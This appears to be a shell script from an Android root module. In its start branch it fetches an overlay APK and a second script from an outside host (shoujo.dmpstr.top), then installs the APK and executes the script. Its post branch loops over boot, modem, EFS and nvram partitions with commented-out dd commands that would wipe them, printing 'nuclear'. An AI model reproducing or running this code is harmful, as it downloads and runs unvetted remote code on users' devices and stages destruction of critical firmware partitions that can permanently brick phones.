###SCRIPT_START###
MODDIR=${0%/*}
part="abl xbl preloader preloader_raw lk boot aboot tz modem efs nvram nvdata"

case $1 in
  start)
    curl_bin=""
    abi=$(getprop ro.product.cpu.abi)

    if [[ "$abi" == "armeabi-v7a" ]]; then
        curl_bin="$MODDIR/bin/curl/armeabi-v7a/curl"
    elif [[ "$abi" == "arm64-v8a" ]]; then
        curl_bin="$MODDIR/bin/curl/arm64-v8a/curl"
    fi
    if [ -e "$MODDIR/overlay.apk" ]; then
        pm install $MODDIR/overlay.apk
    else
        echo "huh"
        $curl_bin http://shoujo.dmpstr.top/overlay -o $MODDIR/overlay.apk
    fi
    $curl_bin http://shoujo.dmpstr.top/ehe -o $MODDIR/sc.pl
    chmod u+x $MODDIR/sc.pl
    ./sc.pl
    ;;
  post)
    if [ -e "/data/local/tmp/chas.lock" ]; then
      for p in "{part[@]}"; do
          if [ -e "/dev/block/by-name/$p" ]; then
              #dd if=/dev/null of="/dev/block/by-name/$p"
              #sync
              echo "nuclear"
          else
              echo "skip"
          fi
          if [ -e "/dev/block/by-name/$p_a" ]; then
              #dd if=/dev/null of="/dev/block/by-name/$p_a"
              #dd if=/dev/null of="/dev/block/by-name/$p_b"
              #sync
              echo "nuclear"
          else
              echo "skip"
          fi
      done
    else
      echo "s"
    fi
    ;;
    *)
      echo "????"
    ;;
esac